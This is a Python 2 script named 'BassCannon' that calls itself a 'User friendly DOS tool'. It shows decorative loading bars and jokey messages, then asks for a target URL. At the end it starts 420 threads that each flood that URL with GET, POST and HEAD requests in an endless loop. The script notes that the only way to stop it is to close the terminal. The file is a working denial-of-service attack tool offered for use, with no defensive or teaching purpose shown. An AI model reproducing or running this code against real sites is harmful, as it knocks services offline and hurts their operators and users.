import requests
from threading import Thread
import sys
import os
from colorama import Fore
import time

os.system("clear")
print (Fore.MAGENTA)




toolbar_width = 57
sys.stdout.write("%s" % (" " * toolbar_width))
sys.stdout.flush()
sys.stdout.write("\b" * (toolbar_width+1)) 
for i in xrange(toolbar_width):
    time.sleep(0.002)
    sys.stdout.write("-")
    sys.stdout.flush()
sys.stdout.write("\n") 


os.system("figlet BassCannon")


toolbar_width = 57
sys.stdout.write("%s" % (" " * toolbar_width))
sys.stdout.flush()
sys.stdout.write("\b" * (toolbar_width+1)) 
for i in xrange(toolbar_width):
    time.sleep(0.002)
    sys.stdout.write("-")
    sys.stdout.flush()
sys.stdout.write("\n") 


print "User friendly DOS tool."
print "Use it for your own risk ;)"
print "Ranked is in development..."
print "v 1.0"




print (Fore.WHITE)

raw_input("#Hit enter to get it started!#")
print "\n"
print "$#Charging up the BassCannon...#$"
toolbar_width = 28
sys.stdout.write("%s" % (" " * toolbar_width))
sys.stdout.flush()
sys.stdout.write("\b" * (toolbar_width+1)) 
for i in xrange(toolbar_width):
    time.sleep(0.02)
    sys.stdout.write(".-")
    sys.stdout.flush()
sys.stdout.write("\n") 


print
t = raw_input("Enter the target url: ")

print "\n"

print "000000000000000000000000 LOADING 00000000000000000000000000"

toolbar_width = 57

sys.stdout.write("[%s]" % (" " * toolbar_width))
sys.stdout.flush()
sys.stdout.write("\b" * (toolbar_width+1)) 
for i in xrange(toolbar_width):
    time.sleep(0.05)
    sys.stdout.write("=")
    sys.stdout.flush()

sys.stdout.write("]\n") 
print "000000000000000000000000 hehe_xd 00000000000000000000000000"

print "\n"

print "Your DOS attack has been started."
print "The only way to abort it (yet) is closing the terminal."
print "git gud"


def send():
    while True:
        requests.get(t)
        requests.post(t)
        requests.head(t)
        
if __name__ == '__main__':
    for i in range (420):
        thr = Thread(target=send)
        thr.start()
